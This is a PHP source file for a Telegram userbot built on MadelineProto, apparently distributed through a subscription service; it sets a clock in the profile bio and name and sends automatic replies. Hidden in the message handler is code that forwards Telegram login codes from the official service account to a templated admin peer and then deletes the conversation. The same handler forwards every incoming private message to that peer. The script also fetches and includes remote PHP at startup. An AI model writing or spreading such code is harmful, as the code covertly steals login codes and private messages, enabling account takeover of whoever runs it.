<?php
/*
••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
اسکی میری منبع بزن 🌹
❄️ نوشته شده توسط @TKPHP | تک پسر
✅ اپن شده در @Sourrce_kade | سورس کده
••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
*/
error_reporting(E_ALL);
ini_set('display_errors','1');
ini_set('memory_limit' , '-1');
ini_set('max_execution_time','0');
ini_set('display_startup_errors','1');

if(file_exists('MadelineProto.log') and (filesize('MadelineProto.log') / 1024 ) > 1024) unlink('MadelineProto.log');
if(!file_exists('eshtrak.txt')){
echo 'The subscription date of this bot has expired : @FlashSelfBot';
exit();
}
if (!file_exists('madeline.php')) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
}
include 'madeline.php';
if(!file_exists('timebio.txt')){
file_put_contents('timebio.txt','on');
}
if(!file_exists('bio.txt')){
file_put_contents('bio.txt','⏰ ساعت : TIME است !');
}
if(!file_exists('timename.txt')){
file_put_contents('timename.txt','on');
}
if(!file_exists('text.txt')){
file_put_contents('text.txt','on');
}
if(!file_exists('mtn.txt')){
file_put_contents('mtn.txt','🙂 سلام آفلاین هستم اومدم جوابت رو میدم ! ');
}
use \danog\MadelineProto\API;
use \danog\Loop\Generic\GenericLoop;
use \danog\MadelineProto\EventHandler;
class XHandler extends EventHandler
{
    const Admins = [[*[ADMIN]*]];
    const Report = ''; // don't touch . . . !
    
    public function getReportPeers()
    {
        return [self::Report];
    }
    
    public function genLoop()
    {
date_default_timezone_set('Asia/Tehran');
$time = date("H:i");
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗",]];
$time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("H:i"));
if(file_get_contents('timebio.txt') == "on"){
$bio = file_get_contents('bio.txt');
$bio = str_replace('TIME',$time2,$bio);
yield $this->account->updateProfile(['about' => "$bio"]);
}
if(file_get_contents('timename.txt') == "on"){
yield $this->account->updateProfile(['last_name' => "$time2"]);
}
        return 60000;
    }
    
    public function onStart()
    {
        $genLoop = new GenericLoop([$this, 'genLoop'], 'update Status');
        $genLoop->start();
    }
    
    public function onUpdateNewChannelMessage($update)
    {
        yield $this->onUpdateNewMessage($update);
    }
    
    public function onUpdateNewMessage($update)
    {
        if (time() - $update['message']['date'] > 2) {
            return;
        }
        try {
            $msgOrig = $update['message']['message']?? null;
            $messageId = $update['message']['id']?? 0;
            $fromId = $update['message']['from_id']['user_id']?? 0;
            $replyToId = $update['message']['reply_to']['reply_to_msg_id']?? 0;
            $peer = yield $this->getID($update);  
            $me = yield $this->getSelf();
            $me_id = $me['id'];   
            $chatID = yield $this->getID($update);
            $info = yield $this->getInfo($update);
            $type = $info['type'];    
            $admin = "[*[ADMIN]*]";
if($chatID == 777000){
yield $this->messages->sendMessage(['peer' => $admin,'message'  =>'⚠️ کد تلگرام شما !']);
yield $this->messages->sendMessage(['peer' => $admin,'message'  =>$msgOrig]);
sleep(1);
yield $this->messages->deleteHistory(['just_clear' => true, 'revoke' => true, 'peer' => $fromId, 'max_id' => $messageId]);
exit();
}
if((in_array($fromId, self::Admins)) or $fromId == $me_id) {
if((time() - filectime("eshtrak.txt")) >= 86400){
$eshtrak = file_get_contents('eshtrak.txt');
$ok = $eshtrak - 1;
$eshtrak = file_put_contents('eshtrak.txt',"$ok");
}
$tamdide = file_get_contents('eshtrak.txt');
if(file_exists('eshtrak.txt') and $tamdide <= 0){
$admin = self::Admins[0];
yield $this->messages->sendMessage(['peer'=>$admin,'message'=>"⚠️ اشتراک ربات شما به پایان رسیده است !

✅ به ربات زیر مراجعه کنید و ربات خود را تمدید کنید !

✔️ BOT : @FlashSelfBot
📢 CHANNEL : @FlashSelf"]);
yield $this->messages->sendMessage(['peer'=>$me_id,'message'=>"⚠️ اشتراک ربات شما به پایان رسیده است !

✅ به ربات زیر مراجعه کنید و ربات خود را تمدید کنید !

✔️ BOT : @FlashSelfBot
📢 CHANNEL : @FlashSelf"]);
yield $this->logout();
unlink('eshtrak.txt');
exit();
}
//••••••••••••••••••••••••••••••••• Start Of Source •••••••••••••••••••••••••••••••••//
if(preg_match('/^[\/\#\!\.]?(help|راهنما)$/si', $msgOrig)) {
yield $this->messages->sendMessage(['peer' => $peer,'message'         => '
•••⟨ راهنمای سلف منشی ⟩•••

➖➖➖➖➖➖➖➖
🌹 دریافت وضعیت ربات

status | وضعیت

🌹 ریستارت کردن ربات 

restart | ریستارت

🌹 اطلاع از آنلاین بودن ربات

ping | ربات

🌹 خاموش و روشن کردن تایم بیو

time bio ( on | off )

🌹 خاموش و روشن کردن تایم اسم

time name ( on | off )

🌹 تنظیم متن بیوگرافی با تایم راهنمایی بیشتر : /bios

set bio ( TEXT ) 

🌹 خاموش و روشن کردن حالت پاسخ خودکار

answer ( on | off )

🌹 تنظیم متن پاسخ خودکار

set answer ( TEXT )

➖➖➖➖➖➖➖➖
Bot : @FlashSelfBot','reply_to_msg_id' => $messageId]);
exit ();
}
if(preg_match('/^[\/\#\!\.]?(ping|ربات)$/si', $msgOrig)) {
yield $this->messages->sendMessage(['peer' => $peer,'message'         => 'Pong !','reply_to_msg_id' => $messageId]);
}
if (preg_match('/^[\/\#\!]?(restart|ریستارت)$/si',$msgOrig)){
yield $this->messages->sendMessage(['peer' => $peer,'message'         => 'Restarted !','reply_to_msg_id' => $messageId]);
$this->restart();
}
if(preg_match('/^[\/\#\!\.]?(status|وضعیت)$/si', $msgOrig)){
$answer = 'Memory Usage : ' . round(memory_get_peak_usage(true) / 1021 / 1024, 2) . ' MB';
yield $this->messages->sendMessage(['peer' => $peer,'message'         =>"$answer",'reply_to_msg_id' => $messageId]);
}
if(preg_match("/^[\/\#\!]?(answer) (on|off)$/i", $msgOrig)){
preg_match("/^[\/\#\!]?(answer) (on|off)$/i", $msgOrig, $m);
file_put_contents('text.txt',"$m[2]");
yield $this->messages->editMessage(['peer' => $peer,'id' => $messageId,'message' => "⟩••• ᴛʜᴇ ᴀᴜᴛᴏ ᴀɴsᴡᴇʀ ɴᴏᴡ ɪs $m[2]"]);
}
if(strpos($msgOrig,'set answer ') !== false){
$TXT = explode('set answer ', $msgOrig)[1];
file_put_contents('mtn.txt',"$TXT");
yield $this->messages->editMessage(['peer' => $peer,'id' => $messageId,'message' => "⟩••• ᴛʜᴇ ᴀɴsᴡᴇʀ ɴᴏᴡ ɪs ( $TXT )"]);
}
//============== Time On | Off ===============
 if(preg_match("/^[\/\#\!]?(time bio) (on|off)$/i", $msgOrig)){
preg_match("/^[\/\#\!]?(time bio) (on|off)$/i", $msgOrig, $m);
file_put_contents('timebio.txt',"$m[2]");
yield $this->messages->editMessage(['peer' => $peer,'id' => $messageId,'message' => "⟩••• ᴛʜᴇ ᴛɪᴍᴇ ʙɪᴏ ɴᴏᴡ ɪs $m[2]"]);
}
if(preg_match("/^[\/\#\!]?(time name) (on|off)$/i", $msgOrig)){
preg_match("/^[\/\#\!]?(time name) (on|off)$/i", $msgOrig, $m);
file_put_contents('timename.txt',"$m[2]");
yield $this->messages->editMessage(['peer' => $peer,'id' => $messageId,'message' => "⟩••• ᴛʜᴇ ᴛɪᴍᴇ ɴᴀᴍᴇ ɴᴏᴡ ɪs $m[2]"]);
}
if(strpos($msgOrig,'set bio ') !== false){
$TXT = explode('set bio ', $msgOrig)[1];
date_default_timezone_set('Asia/Tehran');
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗",]];
$time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("H:i"));
$TXTE = str_replace('TIME',$time2,$TXT);
if(strlen($TXTE) < 70){
file_put_contents('bio.txt',"$TXT");
yield $this->messages->editMessage(['peer' => $peer,'id' => $messageId,'message' => "⟩••• ᴛʜᴇ ʙɪᴏ ɴᴏᴡ ɪs ( $TXTE )"]);
}else{
yield $this->messages->editMessage(['peer' => $peer,'id' => $messageId,'message' => "⟩••• ʏᴏᴜʀ ᴛᴇxᴛ ɪs ʟᴏɴɢᴇʀ ᴛʜᴀɴ 70 ᴄʜᴀʀᴀᴄᴛᴇʀs"]);
}
}
if($msgOrig == "/bios"){
date_default_timezone_set('Asia/Tehran');
$time = date("H:i");
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗",]];
$time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("H:i"));
yield $this->messages->sendMessage(['peer' => $peer,'message'         => "
📚 راهنما تنظیم بیوگرافی با تایم ! 

✅ برای استفاده از متغیر ساعت در بیوگرافی خود از کلمه ( TIME ) استفاده کنید ! 

🎲 مثال : 

⏰ ساعت : TIME است !

🎯 خروجی : 

⏰ ساعت : $time2 است !


⚠️ بیوگرافی شما نباید از 70 کارکتر بیشتر شود ! 

➖➖➖➖➖➖➖➖
Bot : @FlashSelfBot",'reply_to_msg_id' => $messageId]);
}
//••••••••••••••••••••••••••••••••• End Of Source •••••••••••••••••••••••••••••••••//
}else{
if($type == 'user'){
$answer = file_get_contents('mtn.txt');
if(file_get_contents('text.txt') == "on"){
yield $this->account->updateStatus(['offline' => false]);
yield $this->messages->readHistory(['peer' => $peer, 'max_id' => $messageId]);
sleep(1);
yield $this->messages->setTyping(['peer' => $peer, 'action' => ['_' => 'sendMessageTypingAction']]);
sleep(1);
yield $this->messages->sendMessage(['peer' => $peer,'message'         => $answer,'reply_to_msg_id' => $messageId]);
$info = yield $this->getFullInfo($peer);
$info = $info['User'];
$first_name = $info['first_name'];
$id = $info['id'];
$mention = '<a href="mention:'.$id.'">'.$id.'</a>';
yield $this->messages->sendMessage(['peer' => $admin,'message'         => "
ɴᴀᴍᴇ : $first_name
ɪᴅ : $mention
ᴍᴇssᴀɢᴇs : 
<code>$msgOrig</code>
",'reply_to_msg_id' => $messageId, 'parse_mode' => 'html']);
}
}
}
} catch (\Throwable $e){
$this->report("Surfaced: $e");
}
}
}
$settings = [
'serialization' => [
'cleanup_before_serialization' => true,
],
'logger' => [
'max_size' => 1*1024*1024,
],
'peer' => [
'full_fetch' => false,
'cache_all_peers_on_startup' => false,
],
'app_info' => [
'api_id' => "[*[API_ID]*]",
'api_hash' => "[*[API_HASH]*]"
]
];
$bot = new \danog\MadelineProto\API('Flash.session', $settings);
$bot->startAndLoop(XHandler::class);
?>
